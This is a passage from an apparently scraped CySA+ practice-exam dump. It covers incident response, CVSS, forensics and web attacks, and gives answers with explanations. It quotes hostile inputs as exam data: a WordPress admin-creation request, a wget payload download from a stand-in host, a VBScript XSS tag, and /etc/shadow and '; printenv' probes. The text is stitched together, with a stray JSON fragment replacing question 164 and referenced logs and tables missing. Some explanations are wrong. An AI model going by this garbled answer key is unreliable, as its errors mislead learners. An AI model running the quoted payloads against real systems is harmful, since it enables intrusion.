addresses. Since the company does not do business with \nthat country, blocking all traffic from that country reduces unnecessary and potentially malicious \ntraffic, lowering the attack surface and minimizing exposure to threats originating there.  \n  \n  \nQUESTION 156  \nAn analyst has received an IPS event notification from the SIEM stating an IP address, which is \nknown to be malicious, has attempted to exploit a zero-day vulnerability on several web servers. \nThe exploit contained the following snippet:  \n  \n/wp- \njson/trx_addons/V2/get/sc_layout?sc=wp_insert_user&role=administrator  \n  \nWhich of the following controls would work best to mitigate the attack represented by this \nsnippet?  \n  \nA. Limit user creation to administrators only.  \nB. Limit layout creation to administrators only.  \nC. Set the directory trx_addons to read only for all users.  \nD. Set the directory V2 to read only for all users.  \n  \nAnswer: A  \n\n\n \n  \n  \nQUESTION 157  \nA penetration tester submitted data to a form in a web application, which enabled the penetration \ntester to retrieve user credentials. Which of the following should be recommended for remediation \nof this application vulnerability?  \n  \nA. Implementing multifactor authentication on the server OS  \nB. Hashing user passwords on the web application  \nC. Performing input validation before allowing submission  \nD. Segmenting the network between the users and the web server  \n  \nAnswer: C Explanation:  \nPerforming input validation before allowing submission is the best recommendation for \nremediation of this application vulnerability. Input validation is a technique that checks the data \nentered by users or attackers against a set of rules or constraints, such as data type, length, \nformat, or range. Input validation can prevent common web application attacks such as SQL \ninjection, cross-site scripting (XSS), or command injection, which exploit the lack of input \nvalidation to execute malicious code or commands on the server or the client side. By validating \nthe input before allowing submission, the web application can reject or sanitize any malicious or \nunexpected input, and protect the user credentials and other sensitive data from being \ncompromised.  \n  \n  \nQUESTION 158  \nA cybersecurity team lead is developing metrics to present in the weekly executive briefs. \nExecutives are interested in knowing how long it takes to stop the spread of malware that enters \nthe network. Which of the following metrics should the team lead include in the briefs?  \n  \nA. Mean time between failures  \nB. Mean time to detect  \nC. Mean time to remediate  \nD. Mean time to contain  \n  \nAnswer: D Explanation:  \nMean time to contain is the metric that the cybersecurity team lead should include in the weekly \nexecutive briefs, as it measures how long it takes to stop the spread of malware that enters the \nnetwork. Mean time to contain is the average time it takes to isolate and neutralize an incident or \na threat, such as malware, from the time it is detected. Mean time to contain is an important \nmetric for evaluating the effectiveness and efficiency of the incident response process, as well as \nthe potential impact and damage of the incident or threat. A lower mean time to contain indicates \na faster and more successful response, which can reduce the risk and cost of the incident or \nthreat. Mean time to contain can also be compared with other metrics, such as mean time to \ndetect or mean time to remediate, to identify gaps or areas for improvement in the incident \nresponse process.  \n  \n  \nQUESTION 159  \nAn employee accessed a website that caused a device to become infected with invasive \nmalware. The incident response analyst has:  \n  \n- created the initial evidence log.  \n\n\n \n- disabled the wireless adapter on the device.  \n- interviewed the employee, who was unable to identify the website that \nwas accessed.  \n- reviewed the web proxy traffic logs.  \n  \nWhich of the following should the analyst do to remediate the infected device?  \n  \nA. Update the system firmware and reimage the hardware.  \nB. Install an additional malware scanner that will send email alerts to the analyst.  \nC. Configure the system to use a proxy server for Internet access.  \nD. Delete the user profile and restore data from backup.  \n  \nAnswer: A Explanation:  \nUpdating the system firmware and reimaging the hardware is the best action to perform to \nremediate the infected device, as it helps to ensure that the device is restored to a clean and \nsecure state and that any traces of malware are removed. Firmware is a type of software that \ncontrols the low-level functions of a hardware device, such as a motherboard, hard drive, or \nnetwork card. Firmware can be updated or flashed to fix bugs, improve performance, or enhance \nsecurity. Reimaging is a process of erasing and restoring the data on a storage device, such as a \nhard drive or a solid state drive, using an image file that contains a copy of the operating system, \napplications, settings, and files. Reimaging can help to recover from system failures, data \ncorruption, or malware infections. Updating the system firmware and reimaging the hardware can \nhelp to remediate the infected device by removing any malicious code or configuration changes \nthat may have been made by the malware, as well as restoring any missing or damaged files or \nsettings that may have been affected by the malware. This can help to prevent further damage, \ndata loss, or compromise of the device or the network. The other actions are not as effective or \nappropriate as updating the system firmware and reimaging the hardware, as they do not \naddress the root cause of the infection or ensure that the device is fully cleaned and secured. \nInstalling an additional malware scanner that will send email alerts to the analyst may help to \ndetect and remove some types of malware, but it may not be able to catch all malware variants or \nremove them completely. It may also create conflicts or performance issues with other security \ntools or systems on the device. Configuring the system to use a proxy server for Internet access \nmay help to filter or monitor some types of malicious traffic or requests, but it may not prevent or \nremove malware that has already infected the device or that uses other methods of \ncommunication or propagation. Deleting the user profile and restoring data from backup may help \nto recover some data or settings that may have been affected by the malware, but it may not \nremove malware that has infected other parts of the system or that has persisted on the device.  \n  \n  \nQUESTION 160  \nA cloud team received an alert that unauthorized resources were being auto-provisioned. After \ninvestigating, the team suspects that cryptomining is occurring. Which of the following indicators \nwould most likely lead the team to this conclusion?  \n  \nA. High GPU utilization  \nB. Bandwidth consumption  \nC. Unauthorized changes  \nD. Unusual traffic spikes  \n  \nAnswer: A Explanation:  \nHigh GPU utilization is the most likely indicator that cryptomining is occurring, as it reflects the \nintensive computational work that is required to solve the complex mathematical problems \ninvolved in mining cryptocurrencies. Cryptomining is the process of generating new units of a \n\n\n \ncryptocurrency by using computing power to verify transactions and create new blocks on the \nblockchain. Cryptomining can be done legitimately by individuals or groups who participate in a \nmining pool and share the rewards, or illegitimately by threat actors who use malware or scripts \nto hijack the computing resources of unsuspecting victims and use them for their own benefit. \nThis practice is called cryptojacking, and it can cause performance degradation, increased power \nconsumption, and security risks for the affected systems. Cryptomining typically relies on the \nGPU (graphics processing unit) rather than the CPU (central processing unit), as the GPU is \nbetter suited for parallel processing and can handle more calculations per second. Therefore, a \nhigh GPU utilization rate can be a sign that cryptomining is taking place on a system, especially if \nthere is no other explanation for the increased workload. The other options are not as indicative \nof cryptomining as high GPU utilization, as they can have other causes or explanations. \nBandwidth consumption can be affected by many factors, such as network traffic, streaming \nservices, downloads, or updates. It is not directly related to cryptomining, which does not require \na lot of bandwidth to communicate with the mining pool or the blockchain network. Unauthorized \nchanges can be a result of many types of malware or cyberattacks, such as ransomware, \nspyware, or trojans. They are not specific to cryptomining, which does not necessarily alter any \nfiles or settings on the system, but rather uses its processing power. Unusual traffic spikes can \nalso be caused by various factors, such as legitimate surges in demand, distributed denial-\nofservice attacks, or botnets. They are not indicative of cryptomining, which does not generate a \nlot of traffic or requests to or from the system.  \n  \n  \nQUESTION 161  \nA company's security team is updating a section of the reporting policy that pertains to \ninappropriate use of resources (e.g., an employee who installs cryptominers on workstations in \nthe office). Besides the security team, which of the following groups should the issue be \nescalated to first in order to comply with industry best practices?  \n  \nA. Help desk  \nB. Law enforcement  \nC. Legal department  \nD. Board member  \n  \nAnswer: C Explanation:  \nThe legal department is the most appropriate group to escalate this issue to first, as they can \nadvise on the legal implications and actions that can be taken against the employee. The legal \ndepartment can also coordinate with other groups, such as law enforcement, help desk, or board \nmembers, as needed. The other options are not the best choices to escalate the issue to first, as \nthey may not have the authority or expertise to handle the situation properly.  \n  \n  \nQUESTION 162  \nGiven the following CVSS string:  \n  \nCVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  \n  \nWhich of the following attributes correctly describes this vulnerability?  \n  \nA. A user is required to exploit this vulnerability.  \nB. The vulnerability is network based.  \nC. The vulnerability does not affect confidentiality.  \nD. The complexity to exploit the vulnerability is high.  \n\n\n \n  \nAnswer: B Explanation:  \nThe vulnerability is network based is the correct attribute that describes this vulnerability, as it can \nbe inferred from the CVSS string. CVSS stands for Common Vulnerability Scoring System, which \nis a framework that assigns numerical scores and ratings to vulnerabilities based on their \ncharacteristics and severity. The CVSS string consists of several metrics that define different \naspects of the vulnerability, such as the attack vector, the attack complexity, the privileges \nrequired, the user interaction, the scope, and the impact on confidentiality, integrity and \navailability. The first metric in the CVSS string is the attack vector (AV), which indicates how the \nvulnerability can be exploited. The value of AV in this case is N, which stands for network. This \nmeans that the vulnerability can be exploited remotely over a network connection, without \nphysical or logical access to the target system. Therefore, the vulnerability is network based.  \n  \n  \nQUESTION 163  \nA cryptocurrency service company is primarily concerned with ensuring the accuracy of the data \non one of its systems. A security analyst has been tasked with prioritizing vulnerabilities for \nremediation for the system. The analyst will use the following CVSSv3.1 impact metrics for \nprioritization:  \n  \n  \n  \nWhich of the following vulnerabilities should be prioritized for remediation?  \n  \nA. 1 \nB. 2 \nC. 3  \nD. 4  \n  \nAnswer: D Explanation:  \nQuestion states the \"company is primarily concerned with ensuring the accuracy of the data\", or \nintegrity in other words. Preserving the integrity of the data is important. So we will prioritize \nvulnerabilities that affect integrity (I in the CVSS 3.1 metrics)",

      "explanation": "Brady should be prioritized for remediation, as it has the highest risk score and the highest \nnumber of affected users. The risk score is calculated by multiplying the CVSS score by the \nexposure factor, which is the percentage of systems that are vulnerable to the exploit. Brady has \na risk score of 9 x 0.8 = 7.2, which is higher than any other system. Brady also has 500 affected \nusers, which is more than any other system. Therefore, patching brady would reduce the most \nrisk and impact for the organization. The other systems have lower risk scores and lower \nnumbers of affected users, so they can be remediated later.  \n  \n  \nQUESTION 165  \nA security analyst must preserve a system hard drive that was involved in a litigation request. \nWhich of the following is the best method to ensure the data on the device is not modified?  \n  \nA. Generate a hash value and make a backup image.  \nB. Encrypt the device to ensure confidentiality of the data.  \nC. Protect the device with a complex password.  \nD. Perform a memory scan dump to collect residual data  \n  \nAnswer: A Explanation:  \nGenerating a hash value and making a backup image is the best method to ensure the data on \nthe device is not modified, as it creates a verifiable copy of the original data that can be used for \nforensic analysis. Encrypting the device, protecting it with a password, or performing a memory \nscan dump do not prevent the data from being altered or deleted.   \n  \n  \nQUESTION 166  \nWhich of the following best describes the goal of a tabletop exercise?  \n  \n\n\n \nA. To test possible incident scenarios and how to react properly  \nB. To perform attack exercises to check response effectiveness  \nC. To understand existing threat actors and how to replicate their techniques  \nD. To check the effectiveness of the business continuity plan  \n  \nAnswer: A Explanation:  \nA tabletop exercise is a type of simulation exercise that involves testing possible incident \nscenarios and how to react properly, without actually performing any actions or using any \nresources. A tabletop exercise is usually conducted by a facilitator who presents a realistic \nscenario to a group of participants, such as a cyberattack, a natural disaster, or a data breach. \nThe participants then discuss and evaluate their roles, responsibilities, plans, procedures, and \npolicies for responding to the incident, as well as the potential impacts and outcomes. A tabletop \nexercise can help identify strengths and weaknesses in the incident response plan, improve \ncommunication and coordination among the stakeholders, raise awareness and preparedness for \npotential incidents, and provide feedback and recommendations for improvement.  \n  \n  \nQUESTION 167  \nA virtual web server in a server pool was infected with malware after an analyst used the internet \nto research a system issue. After the server was rebuilt and added back into the server pool, \nusers reported issues with the website, indicating the site could not be trusted. Which of the \nfollowing is the most likely cause of the server issue?  \n  \nA. The server was configured to use SSL to securely transmit data.  \nB. The server was supporting weak TLS protocols for client connections.  \nC. The malware infected all the web servers in the pool.  \nD. The digital certificate on the web server was self-signed.  \n  \nAnswer: D Explanation:  \nA digital certificate is a document that contains the public key and identity information of a web \nserver, and is signed by a trusted third-party authority called a certificate authority (CA). A digital \ncertificate allows the web server to establish a secure connection with the clients using the \nHTTPS protocol, and also verifies the authenticity of the web server. A self-signed certificate is a \ndigital certificate that is not signed by a CA, but by the web server itself. A self-signed certificate \ncan cause issues with the website, as it may not be trusted by the clients or their browsers. \nClients may receive warnings or errors when trying to access the website, indicating that the site \ncould not be trusted or that the connection is not secure.   \n  \n  \nQUESTION 168  \nA zero-day command injection vulnerability was published. A security administrator is analyzing \nthe following logs for evidence of adversaries attempting to exploit the vulnerability:  \n  \n\n\n \n  \n  \nWhich of the following log entries provides evidence of the attempted exploit?  \n  \nA. Log entry 1 B. \nLog entry 2 C. \nLog entry 3  \nD. Log entry 4  \n  \nAnswer: C Explanation:  \nLog entry 3 contains the command nullif (1337,1337). This is a SQL command that evaluates to 0 \nif the two arguments are equal and null if they are not equal. The attacker is trying to exploit the \ncommand injection vulnerability by injecting this command into the application.  \n  \n  \nQUESTION 169  \nA security analyst needs to ensure that systems across the organization are protected based on \nthe sensitivity of the content each system hosts. The analyst is working with the respective \nsystem owners to help determine the best methodology that seeks to promote confidentiality, \navailability, and integrity of the data being hosted. Which of the following should the security \nanalyst perform first to categorize and prioritize the respective systems?  \n  \nA. Interview the users who access these systems.  \nB. Scan the systems to see which vulnerabilities currently exist.  \nC. Configure alerts for vendor-specific zero-day exploits.  \nD. Determine the asset value of each system.  \n  \nAnswer: D Explanation:  \nDetermining the asset value of each system is the best action to perform first, as it helps to \ncategorize and prioritize the systems based on the sensitivity of the data they host. The asset \nvalue is a measure of how important a system is to the organization, in terms of its financial, \noperational, or reputational impact. The asset value can help the security analyst to assign a risk \nlevel and a protection level to each system, and to allocate resources accordingly. The other \nactions are not as effective as determining the asset value, as they do not directly address the \ngoal of promoting confidentiality, availability, and integrity of the data. Interviewing the users who \naccess these systems may provide some insight into how the systems are used and what data \nthey contain, but it may not reflect the actual value or sensitivity of the data from an \norganizational perspective. Scanning the systems to see which vulnerabilities currently exist may \nhelp to identify and remediate some security issues, but it does not help to categorize or prioritize \nthe systems based on their data sensitivity. Configuring alerts for vendor-specific zero-day \nexploits may help to detect and respond to some emerging threats, but it does not help to protect \nthe systems based on their data sensitivity.  \n  \n\n\n \n  \nQUESTION 170  \nA security analyst is reviewing the following alert that was triggered by FIM on a critical system:  \n  \n  \n  \nWhich of the following best describes the suspicious activity that is occurring?  \n  \nA. A fake antivirus program was installed by the user.  \nB. A network drive was added to allow exfiltration of data.  \nC. A new program has been set to execute on system start.  \nD. The host firewall on 192.168.1.10 was disabled.  \n  \nAnswer: C Explanation:  \nA new program has been set to execute on system start is the most likely cause of the suspicious \nactivity that is occurring, as it indicates that the malware has modified the registry keys of the \nsystem to ensure its persistence. File Integrity Monitoring (FIM) is a tool that monitors changes to \nfiles and registry keys on a system and alerts the security analyst of any unauthorized or \nmalicious modifications. The alert triggered by FIM shows that the malware has created a new \nregistry key under the Run subkey, which is used to launch programs automatically when the \nsystem starts. The new registry key points to a file named \"update.exe\" in the Temp folder, which \nis likely a malicious executable disguised as a legitimate update file.   \n  \n  \nQUESTION 171  \nWhich of the following best describes the document that defines the expectation to network \ncustomers that patching will only occur between 2:00 a.m. and 4:00 a.m.?  \n  \nA. SLA  \nB. LOI  \nC. MOU  \nD. KPI  \n  \nAnswer: A Explanation:  \nSLA (Service Level Agreement) is the best term to describe the document that defines the \nexpectation to network customers that patching will only occur between 2:00 a.m. and 4:00 a.m., \nas it reflects the agreement between a service provider and a customer that specifies the \nservices, quality, availability, and responsibilities that are agreed upon. An SLA is a common type \nof document that is used in various industries and contexts, such as IT, telecom, cloud \ncomputing, or outsourcing. An SLA typically includes metrics and indicators to measure the \nperformance and quality of the service, such as uptime, response time, or resolution time. An \nSLA also defines the consequences or remedies for any breaches or failures of the service, such \nas penalties, refunds, or credits. An SLA can help to manage customer expectations, formalize \n\n\n \ncommunication, improve productivity, and strengthen relationships. The other terms are not as \naccurate as SLA, as they describe different types of documents or concepts. LOI (Letter of Intent) \nis a document that outlines the main terms and conditions of a proposed agreement between two \nor more parties, before a formal contract is signed. An LOI is usually non-binding and expresses \nthe intention or interest of the parties to enter into a future agreement. An LOI can help to clarify \nthe key points of a deal, facilitate negotiations, or demonstrate commitment. MOU (Memorandum \nof Understanding) is a document that describes a mutual agreement or cooperation between two \nor more parties, without creating any legal obligations or commitments. An MOU is usually more \nformal than an LOI, but less formal than a contract. An MOU can help to establish a common \nground, define roles and responsibilities, or outline expectations and goals. KPI (Key \nPerformance Indicator) is a concept that refers to a measurable value that demonstrates how \neffectively an organization or individual is achieving its key objectives or goals. A KPI is usually \nquantifiable and specific, such as revenue growth, customer satisfaction, or employee retention. \nA KPI can help to track progress, evaluate performance, or identify areas for improvement.  \n  \n  \nQUESTION 172  \nA cybersecurity analyst is reviewing SIEM logs and observes consistent requests originating from \nan internal host to a blocklisted external server. Which of the following best describes the activity \nthat is taking place?  \n  \nA. Data exfiltration  \nB. Rogue device  \nC. Scanning  \nD. Beaconing  \n  \nAnswer: D Explanation:  \nBeaconing is the best term to describe the activity that is taking place, as it refers to the periodic \ncommunication between an infected host and a blocklisted external server. Beaconing is a \ncommon technique used by malware to establish a connection with a command-and-control (C2) \nserver, which can provide instructions, updates, or exfiltration capabilities to the malware. \nBeaconing can vary in frequency, duration, and payload, depending on the type and \nsophistication of the malware. The other terms are not as accurate as beaconing, as they \ndescribe different aspects of malicious activity. Data exfiltration is the unauthorized transfer of \ndata from a compromised system to an external destination, such as a C2 server or a cloud \nstorage service. Data exfiltration can be a goal or a consequence of malware infection, but it \ndoes not necessarily involve blocklisted servers or consistent requests. Rogue device is a device \nthat is connected to a network without authorization or proper security controls. Rogue devices \ncan pose a security risk, as they can introduce malware, bypass firewalls, or access sensitive \ndata. However, rogue devices are not necessarily infected with malware or communicating with \nblocklisted servers. Scanning is the process of probing a network or a system for vulnerabilities, \nopen ports, services, or other information. Scanning can be performed by legitimate \nadministrators or malicious actors, depending on the intent and authorization. Scanning does not \nimply consistent requests or blocklisted servers, as it can target any network or system.  \n  \n  \nQUESTION 173  \nAn incident response team is working with law enforcement to investigate an active web server \ncompromise. The decision has been made to keep the server running and to implement \ncompensating controls for a period of time. The web service must be accessible from the internet \nvia the reverse proxy and must connect to a database server. Which of the following \ncompensating controls will help contain the adversary while meeting the other requirements? \n(Choose two).  \n\n\n \n  \nA. Drop the tables on the database server to prevent data exfiltration.  \nB. Deploy EDR on the web server and the database server to reduce the adversary's \ncapabilities.  \nC. Stop the httpd service on the web server so that the adversary can not use web exploits.  \nD. Use microsegmentation to restrict connectivity to/from the web and database servers.  \nE. Comment out the HTTP account in the /etc/passwd file of the web server.  \nF. Move the database from the database server to the web server.  \n  \nAnswer: BD \nExplanation:  \nDeploying EDR on the web server and the database server to reduce the adversaries capabilities \nand using micro segmentation to restrict connectivity to/from the web and database servers are \ntwo compensating controls that will help contain the adversary while meeting the other \nrequirements. A compensating control is a security measure that is implemented to mitigate the \nrisk of a vulnerability or an attack when the primary control is not feasible or effective. EDR \nstands for Endpoint Detection and Response, which is a tool that monitors endpoints for \nmalicious activity and provides automated or manual response capabilities. EDR can help contain \nthe adversary by detecting and blocking their actions, such as data exfiltration, lateral movement, \nprivilege escalation, or command execution. Micro segmentation is a technique that divides a \nnetwork into smaller segments based on policies and rules, and applies granular access controls \nto each segment. Micro segmentation can help contain the adversary by isolating the web and \ndatabase servers from other parts of the network, and limiting the traffic that can flow between \nthem.  \n  \nQUESTION 174  \nAn incident response team member is triaging a Linux server. The output is shown below:  \n  \n  \n  \nWhich of the following is the adversary most likely trying to do?  \n  \nA. Create a backdoor root account named zsh.  \nB. Execute commands through an unsecured service account.  \nC. Send a beacon to a command-and-control server.  \nD. Perform a denial-of-service attack on the web server.  \n  \nAnswer: B Explanation:  \n\n\n \nThe log output indicates an attempt to execute a command via an unsecured service account, \nspecifically using a wget command to download a file from an external source. This suggests that \nthe adversary is trying to exploit a vulnerability in the web server to run unauthorized commands, \nwhich is a common technique for gaining a foothold or further compromising the system. The \npresence of wget http://grohl.ve.da/tmp/brkgtr.zip indicates an attempt to download and possibly \nexecute a malicious payload.  \n  \n  \nQUESTION 175  \nA SOC analyst identifies the following content while examining the output of a debugger \ncommand over a client-server application:  \n  \ngetConnection(database01,\"alpha\" ,\"AxTv.127GdCx94GTd\");  \n  \nWhich of the following is the most likely vulnerability in this system?  \n  \nA. Lack of input validation  \nB. SQL injection  \nC. Hard-coded credential  \nD. Buffer overflow  \n  \nAnswer: C Explanation:  \nThe most likely vulnerability in this system is hard-coded credential. Hard-coded credential is a \npractice of embedding or storing a username, password, or other sensitive information in the \nsource code or configuration file of a system or application. Hard-coded credential can pose a \nserious security risk, as it can expose the system or application to unauthorized access, data \ntheft, or compromise if the credential is discovered or leaked by an attacker. Hard-coded \ncredential can also make it difficult to change or update the credential if needed, as it may require \nmodifying the code or file and redeploying the system or application.  \n  \n  \nQUESTION 176  \nA technician is analyzing output from a popular network mapping tool for a PCI audit:  \n  \n \n\n\n \n  \nWhich of the following best describes the output?  \n  \nA. The host is not up or responding.  \nB. The host is running excessive cipher suites.  \nC. The host is allowing insecure cipher suites.  \nD. The Secure Shell port on this host is closed.  \n  \nAnswer: C Explanation:  \nThe output shows the result of running the ssl-enum-ciphers script with Nmap, which is a tool that \ncan scan web servers for supported SSL/TLS cipher suites. Cipher suites are combinations of \ncryptographic algorithms that are used to establish secure communication between a client and a \nserver. The output shows the cipher suites that are supported by the server, along with a letter \ngrade (A through F) indicating the strength of the connection. The output also shows the least \nstrength, which is the strength of the weakest cipher offered by the server. In this case, the least \nstrength is F, which means that the server is allowing insecure cipher suites that are vulnerable to \nattacks or have been deprecated. For example, the output shows that the server supports SSLv3, \nwhich is an outdated and insecure protocol that is susceptible to the POODLE attack. The output \nalso shows that the server supports RC4, which is a weak and broken stream cipher that should \nnot be used. Therefore, the best description of the output is that the host is allowing insecure \ncipher suites. The other descriptions are not accurate, as they do not reflect what the output \n\n\n \nshows. The host is not up or responding is incorrect, as the output clearly shows that the host is \nup and responding to the scan. The host is running excessive cipher suites is incorrect, as the \noutput does not indicate how many cipher suites the host is running, only which ones it supports. \nThe Secure Shell port on this host is closed is incorrect, as the output does not show anything \nabout port 22, which is the default port for Secure Shell (SSH). The output only shows \ninformation about port 443, which is the default port for HTTPS.  \n  \n  \nQUESTION 177  \nA managed security service provider is having difficulty retaining talent due to an increasing \nworkload caused by a client doubling the number of devices connected to the network. Which of \nthe following would best aid in decreasing the workload without increasing staff?  \n  \nA. SIEM  \nB. XDR  \nC. SOAR  \nD. EDR  \n  \nAnswer: C Explanation:  \nSOAR stands for Security Orchestration, Automation and Response, which is a set of features \nthat can help security teams manage, prioritize and respond to security incidents more efficiently \nand effectively. SOAR can help decrease the workload without increasing staff by automating \nrepetitive tasks, streamlining workflows, integrating different tools and platforms, and providing \nactionable insights and recommendations. SOAR is also one of the current trends that CompTIA \nCySA+ covers in its exam objectives.   \n  \n  \nQUESTION 178  \nAn employee is suspected of misusing a company-issued laptop. The employee has been \nsuspended pending an investigation by human resources. Which of the following is the best step \nto preserve evidence?  \n  \nA. Disable the user's network account and access to web resources.  \nB. Make a copy of the files as a backup on the server.  \nC. Place a legal hold on the device and the user's network share.  \nD. Make a forensic image of the device and create a SHA-1 hash.  \n  \nAnswer: D Explanation:  \nMaking a forensic image of the device and creating a SRA-I hash is the best step to preserve \nevidence, as it creates an exact copy of the device's data and verifies its integrity. A forensic \nimage is a bit-by-bit copy of the device's storage media, which preserves all the information on \nthe device, including deleted or hidden files. A SRA-I hash is a cryptographic value that is \ncalculated from the forensic image, which can be used to prove that the image has not been \naltered or tampered with. The other options are not as effective as making a forensic image and \ncreating a SRA-I hash, as they may not capture all the relevant data, or they may not provide \nsufficient verification of the evidence's authenticity.   \n  \n  \nQUESTION 179  \nAn analyst receives threat intelligence regarding potential attacks from an actor with seemingly \nunlimited time and resources. Which of the following best describes the threat actor attributed to \nthe malicious activity?  \n\n\n \n  \nA. Insider threat  \nB. Ransomware group  \nC. Nation-state  \nD. Organized crime  \n  \nAnswer: C  \n  \n  \nQUESTION 180  \nA systems analyst is limiting user access to system configuration keys and values in a Windows \nenvironment. Which of the following describes where the analyst can find these configuration \nitems?  \n  \nA. config.ini  \nB. ntds.dit  \nC. Master boot record  \nD. Registry  \n  \nAnswer: D  \n  \n  \nQUESTION 181  \nWhile reviewing web server logs, a security analyst found the following line:  \n  \n< IMG SRC='vbscript:msgbox(\"test\")' >  \n  \nWhich of the following malicious activities was attempted?  \n  \nA. Command injection  \nB. XML injection  \nC. Server-side request forgery  \nD. Cross-site scripting  \n  \nAnswer: D Explanation:  \nXSS is a type of web application attack that exploits the vulnerability of a web server or browser \nto execute malicious scripts or commands on the client-side. XSS attackers inject malicious code, \nsuch as JavaScript, VBScript, HTML, or CSS, into a web page or application that is viewed by \nother users. The malicious code can then access or manipulate the user's session, cookies, \nbrowser history, or personal information, or perform actions on behalf of the user, such as \nstealing credentials, redirecting to phishing sites, or installing malware The line in the web server \nlog shows an example of an XSS attack using VBScript. The attacker tried to insert an <IMG> tag \nwith a malicious SRC attribute that contains a VBScript code. The VBScript code is intended to \ndisplay a message box with the text \"test\" when the user views the web page or application. This \nis a simple and harmless example of XSS, but it could be used to test the vulnerability of the web \nserver or browser, or to launch more sophisticated and harmful attacks.  \n  \n  \nQUESTION 182  \nA security analyst at a company called ACME Commercial notices there is outbound traffic to a \nhost IP that resolves to https://office365password.acme.co. The site's standard VPN logon page \nis www.acme.com/logon. Which of the following is most likely true?  \n\n\n \n  \nA. This is a normal password change URL.  \nB. The security operations center is performing a routine password audit.  \nC. A new VPN gateway has been deployed.  \nD. A social engineering attack is underway.  \n  \nAnswer: D Explanation:  \nA social engineering attack is underway is the most likely explanation for the outbound traffic to a \nhost IP that resolves to https://offce365password.acme.co, while the site's standard VPN logon \npage is www.acme.com/logon. A social engineering attack is a technique that exploits human \npsychology and behavior to manipulate people into performing actions or divulging information \nthat benefit the attackers. A common type of social engineering attack is phishing, which involves \nsending fraudulent emails or other messages that appear to come from a legitimate source, such \nas a company or a colleague, and lure the recipients into clicking on malicious links or \nattachments, or entering their credentials or other sensitive information on fake websites. In this \ncase, the attackers may have registered a domain name that looks similar to the company's \ndomain name, but with a typo (offce365 instead of office365), and set up a fake website that \nmimics the company's VPN logon page. The attackers may have also sent phishing emails to the \ncompany's employees, asking them to reset their passwords or log in to their VPN accounts \nusing the malicious link. The security analyst should investigate the source and content of the \nphishing emails, and alert the employees not to click on any suspicious links or enter their \ncredentials on any untrusted websites.  \n  \nQUESTION 183  \nA security analyst is performing vulnerability scans on the network. The analyst installs a scanner \nappliance, configures the subnets to scan, and begins the scan of the network. Which of the \nfollowing would be missing from a scan performed with this configuration?  \n  \nA. Operating system version  \nB. Registry key values  \nC. Open ports  \nD. IP address  \n  \nAnswer: B Explanation:  \nRegistry key values would be missing from a scan performed with this configuration, as the \nscanner appliance would not have access to the Windows Registry of the scanned systems. The \nWindows Registry is a database that stores configuration settings and options for the operating \nsystem and installed applications. To scan the Registry, the scanner would need to have \ncredentials to log in to the systems and run a local agent or script. The other items would not be \nmissing from the scan, as they can be detected by the scanner appliance without credentials. \nOperating system version can be identified by analyzing service banners or fingerprinting \ntechniques. Open ports can be discovered by performing a port scan or sending probes to \ncommon ports. IP address can be obtained by resolving the hostname or using network \ndiscovery tools.   \n  \n  \nQUESTION 184  \nA security analyst discovers an LFI vulnerability that can be exploited to extract credentials from \nthe underlying host. Which of the following patterns can the security analyst use to search the \nweb server logs for evidence of exploitation of that particular vulnerability?  \n  \nA. /etc/shadow  \nB. curl localhost  \n\n\n \nC. ; printenv  \nD. cat /proc/self/  \n  \nAnswer: A Explanation:  \n/etc/shadow is the pattern that the security analyst can use to search the web server logs for \nevidence of exploitation of the LFI vulnerability that can be exploited to extract credentials from \nthe underlying host. LFI stands for Local File Inclusion, which is a vulnerability that allows an \nattacker to include local files on the web server into the output of a web application. LFI can be \nexploited to extract sensitive information from the web server, such as configuration files, \npasswords, or source code. The /etc/shadow file is a file that stores the encrypted passwords of \nall users on a Linux system. If an attacker can exploit the LFI vulnerability to include this file into \nthe web application output, they can obtain the credentials of the users on the web server. \nTherefore, the security analyst can look for /etc/shadow in the request line of the web server logs \nto see if any attacker has attempted or succeeded in exploiting the LFI vulnerability.   \n  \n  \nQUESTION 185  \nA company is in the process of implementing a vulnerability management program. Which of the \nfollowing scanning methods should be implemented to minimize the risk of OT/ICS devices \nmalfunctioning due to the vulnerability identification process?  \n  \nA. Non-credentialed scanning  \nB. Passive scanning  \nC. Agent-based scanning  \nD. Credentialed scanning  \n  \nAnswer: B Explanation:  \nPassive scanning is a method of vulnerability identification that does not send any packets or \nprobes to the target devices, but rather observes and analyzes the network traffic passively. \nPassive scanning can minimize the risk of OT/ICS devices malfunctioning due to the vulnerability \nidentification process, as it does not interfere with the normal operation of the devices or cause \nany network disruption. Passive scanning can also detect vulnerabilities that active scanning may \nmiss, such as misconfigured devices, rogue devices or unauthorized traffic.   \n  \n  \nQUESTION 186  \nA company receives a penetration test report summary from a third party. The report summary \nindicates a proxy has some patches that need to be applied. The proxy is sitting in a rack and is \nnot being used, as the company has replaced it with a new one. The CVE score of the \nvulnerability on the proxy is a 9.8. Which of the following best practices should the company \nfollow with this proxy?  \n  \nA. Leave the proxy as is.  \nB. Decomission the proxy.  \nC. Migrate the proxy to the cloud.  \nD. Patch the proxy.  \n  \nAnswer: B  \nExplanation:  \nThe best practice that the company should follow with this proxy is to decommission the proxy. \nDecommissioning the proxy involves removing or disposing of the proxy from the rack and the \nnetwork, as well as deleting or wiping any data or configuration on the proxy. Decommissioning \n\n\n \nthe proxy can help eliminate the vulnerability on the proxy, as well as reduce the attack surface, \ncomplexity, or cost of maintaining the network. Decommissioning the proxy can also free up \nspace or resources for other devices or systems that are in use or needed by the company.  \n  \n  \nQUESTION 187  \nAn analyst is examining events in multiple systems but is having difficulty correlating data points. \nWhich of the following is most likely the issue with the system?  \n  \nA. Access rights  \nB. Network segmentation  \nC. Time synchronization  \nD. Invalid playbook  \n  \nAnswer: C Explanation:  \nTime synchronization is the process of ensuring that all systems in a network have the same \naccurate time, which is essential for correlating data points from different sources. If the system \nhas an issue with time synchronization, the analyst may have difficulty matching events that \noccurred at the same time or in a specific order. Access rights, network segmentation, and invalid \nplaybook are not directly related to the issue of correlating data points.  \n  \nQUESTION 188  \nAn analyst recommends that an EDR agent collect the source IP address, make a connection to \nthe firewall, and create a policy to block the malicious source IP address across the entire \nnetwork automatically. Which of the following is the best option to help the analyst implement this \nrecommendation?  \n  \nA. SOAR  \nB. SIEM  \nC. SLA  \nD. IoC  \n  \nAnswer: A Explanation:  \nSOAR (Security Orchestration, Automation, and Response) is the best option to help the analyst \nimplement the recommendation, as it reflects the software solution that enables security teams to \nintegrate and coordinate separate tools into streamlined threat response workflows and automate \nrepetitive tasks. SOAR is a term coined by Gartner in 2015 to describe a technology that \ncombines the functions of security incident response platforms, security orchestration and \nautomation platforms, and threat intelligence platforms in one 